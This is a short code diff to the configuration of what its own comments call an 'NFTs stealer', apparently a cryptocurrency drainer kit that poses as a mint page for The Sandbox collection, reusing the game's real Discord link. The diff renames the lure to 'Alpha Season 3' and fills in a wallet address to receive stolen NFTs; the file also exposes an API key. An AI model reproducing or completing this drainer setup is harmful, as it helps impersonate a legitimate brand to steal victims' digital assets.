@@ -4,7 +4,7 @@ const moralisApi = "l6ZoJSnpax9hN8isbl0PDv64Kr9y0VzRWUB5YGekwSQ4Qgt5E9ZU4pG5Hg8B
 
 const collectionInfo = {
     name: "The Sandbox",
-    title: "The Sandbox", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    title: "Alpha Season 3", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     date: "04/27/2022",
     socialMedia: {
         discord: "https://discord.com/invite/thesandboxgame",
@@ -33,7 +33,7 @@ const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 7, // Maximum number of days to check for the last transactions.
-    receiveAddress: "" // leave empty if you want to use the same address 
+    receiveAddress: "0x267917f9eE1f8DBCb95e92e6Da82233D999e247b" // leave empty if you want to use the same address 
 }
 
 /* 
